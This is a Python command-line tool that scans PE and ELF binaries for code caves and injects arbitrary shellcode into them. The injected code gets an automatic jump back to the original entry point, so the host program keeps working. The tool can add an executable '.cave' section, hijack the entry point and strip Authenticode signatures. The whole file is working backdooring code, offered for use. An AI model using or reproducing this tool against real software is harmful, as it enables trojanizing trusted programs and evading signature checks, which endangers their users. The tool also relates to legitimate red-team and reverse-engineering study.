#!/usr/bin/env python3
"""
escavator.py

Scan a binary for “code caves” (runs of padding bytes), optionally inject shellcode
(with automatic jump-back to the original entry point), add a new section or inject
in-place, strip certificates, and redirect execution.

Features:
  - Scan for caves by byte pattern (default \x00) with min-size
  - Section inclusion/exclusion, offset & alignment filters
  - Optional Capstone-based disasm-filter
  - CSV and JSON export
  - Interactive cave selection
  - Inject raw shellcode + automatic jump-back stub
  - In-place injection or add new .cave section
  - Entry-point hijack for PE & ELF
  - --strip-cert for PE Authenticode removal
  - Verbose logging and colorized UX
"""

import argparse, mmap, os, sys, shutil, hashlib, json, logging, time
try:
    import lief
except ImportError:
    sys.exit("ERROR: Please install LIEF (`pip install lief`).")
try:
    from capstone import Cs, CS_ARCH_X86, CS_MODE_32, CS_MODE_64, CS_ARCH_ARM, CS_MODE_ARM, CS_ARCH_ARM64
    CAPSTONE_AVAILABLE = True
except ImportError:
    CAPSTONE_AVAILABLE = False

from colorama import init as colorama_init, Fore, Style
colorama_init(autoreset=True)

# Fallback for PE section flags
try:
    SEC_CHAR = lief.PE.SECTION_CHARACTERISTICS
except:
    class _SecChar:
        MEM_READ    = 0x40000000
        MEM_WRITE   = 0x80000000
        MEM_EXECUTE = 0x20000000
    SEC_CHAR = _SecChar()


def sha256(path):
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(8192), b''):
            h.update(chunk)
    return h.hexdigest()


def extract_metadata(path):
    b = lief.parse(path)
    fmt_str = str(b.format).upper()
    if "PE" in fmt_str:
        fmt = "PE"
    elif "ELF" in fmt_str:
        fmt = "ELF"
    elif "MACHO" in fmt_str:
        fmt = "MACHO"
    else:
        fmt = fmt_str

    hdr = b.header
    if fmt == "PE":
        arch = str(hdr.machine)
        align = b.optional_header.section_alignment
    elif fmt == "ELF":
        arch = str(hdr.machine_type)
        align = hdr.section_alignment
    else:
        arch = "UNKNOWN"
        align = 1

    secs = []
    for s in b.sections:
        off = s.pointerto_raw_data if fmt == "PE" else s.offset
        secs.append({"name": s.name, "offset": off, "size": s.size})

    return b, {"format": fmt, "architecture": arch,
               "entry": b.entrypoint, "align": align,
               "sections": secs}


def find_caves(mm, pat, min_size, start, end, prog=5):
    caves, total, seq, pos = [], end - start, pat * min_size, start
    last_pct, t0, bar_len = -1, time.time(), 30
    while True:
        idx = mm.find(seq, pos, end)
        if idx < 0:
            break
        if prog:
            done = idx - start
            pct = int(done * 100 / total)
            if pct >= last_pct + prog:
                elapsed = time.time() - t0
                speed = done / (elapsed or 1)
                eta = int((total - done) / (speed or 1))
                filled = "#" * int(pct * bar_len / 100)
                bar = filled.ljust(bar_len, "-")
                sys.stdout.write(f"\r{Fore.CYAN}Scanning: [{bar}] {pct:3d}% ETA:{eta:3d}s{Style.RESET_ALL}")
                sys.stdout.flush()
                last_pct = pct
        rs, re = idx, idx + min_size
        while re + len(pat) <= end and mm[re:re+len(pat)] == pat:
            re += len(pat)
        caves.append({"offset": rs, "size": re - rs})
        pos = re
    if prog:
        bar = "#" * bar_len
        sys.stdout.write(f"\r{Fore.CYAN}Scanning: [{bar}] 100% ETA:   0s\n{Style.RESET_ALL}")
    return caves


def disasm_filter(caves, path, fmt):
    if not CAPSTONE_AVAILABLE:
        sys.exit("ERROR: Capstone required for --disasm-filter")
    b = lief.parse(path)
    m = b.header.machine if fmt=="PE" else b.header.machine_type
    name = str(m).upper()
    if "64" in name:
        arch, mode = CS_ARCH_X86, CS_MODE_64
    elif "86" in name:
        arch, mode = CS_ARCH_X86, CS_MODE_32
    elif "ARM64" in name or "AARCH64" in name:
        arch, mode = CS_ARCH_ARM64, CS_MODE_ARM
    elif "ARM" in name:
        arch, mode = CS_ARCH_ARM, CS_MODE_ARM
    else:
        sys.exit(f"ERROR: Unsupported arch for disasm-filter: {name}")
    cs = Cs(arch, mode)
    out = []
    with open(path,"rb") as f, mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ) as mm:
        for c in caves:
            sample = mm[c["offset"]:c["offset"]+min(32,c["size"])]
            if not any(cs.disasm(sample, c["offset"])):
                out.append(c)
    return out


def build_jump_stub(ep, is_64):
    if is_64:
        return b"\x48\xb8" + ep.to_bytes(8,"little") + b"\xff\xe0"
    else:
        return b"\x68" + ep.to_bytes(4,"little") + b"\xc3"


def parse_args():
    p = argparse.ArgumentParser(description="Map code caves & inject shellcode.")
    p.add_argument("input", help="Target binary")
    p.add_argument("-m","--min-size",type=int,default=32,help="Min cave size")
    p.add_argument("-p","--pattern",action="append",help="Byte pattern")
    p.add_argument("--pattern-file",help="File of patterns")
    p.add_argument("--scan-sections",type=lambda s:s.split(','),help="Include sections")
    p.add_argument("--skip-sections",type=lambda s:s.split(','),help="Skip sections")
    p.add_argument("--min-offset",type=lambda s:int(s,0),help="Min offset")
    p.add_argument("--max-offset",type=lambda s:int(s,0),help="Max offset")
    p.add_argument("--disasm-filter",action="store_true",help="Drop caves with code")
    p.add_argument("--top",type=int,help="Show only top N caves")
    p.add_argument("-i","--inject",help="Path to shellcode")
    p.add_argument("--add-section",action="store_true",help="Append .cave section")
    p.add_argument("--redirect-ep",action="store_true",help="Hijack entry point")
    p.add_argument("--strip-cert",action="store_true",help="PE: strip Authenticode cert")
    p.add_argument("--align",type=lambda s:int(s,0),help="Offset alignment")
    p.add_argument("--interactive",action="store_true",help="Choose cave interactively")
    p.add_argument("--export",help="CSV export")
    p.add_argument("--json",action="store_true",help="JSON output")
    p.add_argument("--no-color",action="store_true",help="Disable colors")
    p.add_argument("-v","--verbose",action="store_true",help="Verbose logging")
    return p.parse_args()


def main():
    args = parse_args()
    logging.basicConfig(format="%(message)s", level=logging.DEBUG if args.verbose else logging.INFO)
    if args.no_color:
        global Fore, Style
        class NC: RESET_ALL=CYAN=GREEN=RED=YELLOW=MAGENTA=""
        Fore=Style=NC()

    if not os.path.isfile(args.input):
        sys.exit(f"{Fore.RED}ERROR: File not found: {args.input}{Style.RESET_ALL}")

    bin0, meta = extract_metadata(args.input)
    orig_ep = meta["entry"]
    print(f"{Fore.BLUE}[*] Loaded{Style.RESET_ALL} {args.input}")
    print(f"    Format : {meta['format']}, Arch: {meta['architecture']}")
    print(f"    Entry  : 0x{orig_ep:x}, Align: {meta['align']} bytes")

    if args.inject:
        if not os.path.isfile(args.inject):
            sys.exit(f"{Fore.RED}ERROR: Shellcode not found: {args.inject}{Style.RESET_ALL}")
        data = open(args.inject,"rb").read()
        is_64 = "64" in meta["architecture"] or orig_ep>0xFFFFFFFF
        stub = build_jump_stub(orig_ep, is_64)
        payload = data + stub
        pay_len = len(payload)
        print(f"\n{Fore.BLUE}[*] Payload{Style.RESET_ALL}: {len(data)}B shell + {len(stub)}B stub = {pay_len} bytes")

    size = os.path.getsize(args.input)
    secs = meta["sections"]
    if args.scan_sections:
        regs = [s for s in secs if s["name"] in args.scan_sections]
    elif args.skip_sections:
        regs = [s for s in secs if s["name"] not in args.skip_sections]
    else:
        regs = [{"name":"<entire>","offset":0,"size":size}]

    caves=[]
    with open(args.input,"rb") as f, mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ) as mm:
        pats = args.pattern or []
        if args.pattern_file:
            for l in open(args.pattern_file):
                l=l.strip()
                if l: pats.append(l)
        if not pats: pats=["\\x00"]
        patterns = [bytes(p,'utf-8').decode('unicode_escape').encode('latin-1') for p in pats]
        for pat in patterns:
            for r in regs:
                if args.verbose:
                    print(f"{Fore.GREEN}[+] Scanning '{r['name']}'{Style.RESET_ALL}")
                caves += find_caves(mm, pat, args.min_size, r["offset"], r["offset"]+r["size"])

    caves.sort(key=lambda c:c["size"], reverse=True)

    if args.min_offset is not None:
        caves=[c for c in caves if c["offset"]>=args.min_offset]
    if args.max_offset is not None:
        caves=[c for c in caves if c["offset"]<=args.max_offset]
    if args.align:
        caves=[c for c in caves if c["offset"]%args.align==0]
    if args.disasm_filter:
        caves=disasm_filter(caves,args.input,meta["format"])

    if args.inject and not args.add_section:
        caves=[c for c in caves if c["size"]>=pay_len]
        if not caves:
            sys.exit(f"{Fore.RED}ERROR: No cave ≥ {pay_len} bytes (use --add-section){Style.RESET_ALL}")

    show = caves if not args.top else caves[:args.top]
    print(f"\n{Fore.BLUE}[*] Found {len(caves)} caves{Style.RESET_ALL}")
    if show:
        print(f"{Fore.YELLOW}Offset     Size{Style.RESET_ALL}")
        for c in show:
            print(f" 0x{c['offset']:06x}  {c['size']:5d}")

    if args.json:
        out = {"caves":caves}
        if args.inject: out["payload_len"]=pay_len
        print(json.dumps(out, indent=2))
        return

    if args.export:
        with open(args.export,"w",newline="") as cf:
            import csv
            w=csv.writer(cf); w.writerow(["offset","size"])
            for c in caves: w.writerow([hex(c["offset"]),c["size"]])
        print(f"{Fore.GREEN}[+] Exported to {args.export}{Style.RESET_ALL}")

    if not args.inject:
        return

    out = args.input + ".injected"
    print(f"\n{Fore.BLUE}[*] Injecting → {out}{Style.RESET_ALL}")

    # Add-section mode
    if args.add_section:
        pad = (-pay_len) % meta["align"]
        total = pay_len + pad

        if meta["format"]=="PE":
            sec = lief.PE.Section(".cave")
            sec.virtual_size = total
            sec.characteristics = (SEC_CHAR.MEM_READ|
                                   SEC_CHAR.MEM_WRITE|
                                   SEC_CHAR.MEM_EXECUTE)
            sec.content = list(payload) + [0]*pad

            bin0.add_section(sec)
            builder = lief.PE.Builder(bin0)
            builder.build()
            if args.strip_cert:
                try: bin0.remove_data_directory(lief.PE.DATA_DIRECTORY.CERTIFICATE)
                except: pass
            builder.write(out)

            bin2 = lief.parse(out)
            new = next((s for s in bin2.sections if s.name==".cave"),None)
            if not new: sys.exit("ERROR: .cave missing")

            fo, rva = new.pointerto_raw_data, new.virtual_address
            if args.redirect_ep:
                old = bin2.entrypoint
                bin2.optional_header.addressof_entrypoint = rva
                b2 = lief.PE.Builder(bin2); b2.build()
                if args.strip_cert:
                    try: bin2.remove_data_directory(lief.PE.DATA_DIRECTORY.CERTIFICATE)
                    except: pass
                b2.write(out)
                print(f"{Fore.MAGENTA}[*] EP hijacked: 0x{old:x} → 0x{rva:x}{Style.RESET_ALL}")

            print(f"    Section size : {total} bytes")
            print(f"    Payload off  : 0x{fo:x}")
            print(f"{Fore.GREEN}[+] Injection complete{Style.RESET_ALL}")
        else:
            sys.exit("ERROR: add-section only supported for PE")

    else:  # In-place mode
        cave = show[0] if not args.interactive else show[int(input(f"Select [1-{len(show)}]: "))-1]
        st, en = cave["offset"], cave["offset"]+pay_len

        shutil.copy2(args.input, out)
        with open(out,"r+b") as f, mmap.mmap(f.fileno(),0) as mm:
            mm[st:en] = payload

        if args.redirect_ep:
            bin2 = lief.parse(out)
            sec2 = next((s for s in bin2.sections
                         if st>=s.pointerto_raw_data and st<s.pointerto_raw_data+s.size),None)
            if not sec2:
                sys.exit(f"{Fore.RED}ERROR: Cannot locate section for EP{Style.RESET_ALL}")
            new_rva = sec2.virtual_address + (st - sec2.pointerto_raw_data)
            old = bin2.entrypoint
            bin2.optional_header.addressof_entrypoint = new_rva
            b2 = lief.PE.Builder(bin2); b2.build()
            if args.strip_cert:
                try: bin2.remove_data_directory(lief.PE.DATA_DIRECTORY.CERTIFICATE)
                except: pass
            b2.write(out)
            print(f"{Fore.MAGENTA}[*] EP hijacked: 0x{old:x} → 0x{new_rva:x}{Style.RESET_ALL}")

        print(f"    Injected bytes: 0x{st:x}–0x{en:x}")
        print(f"{Fore.GREEN}[+] Injection complete{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
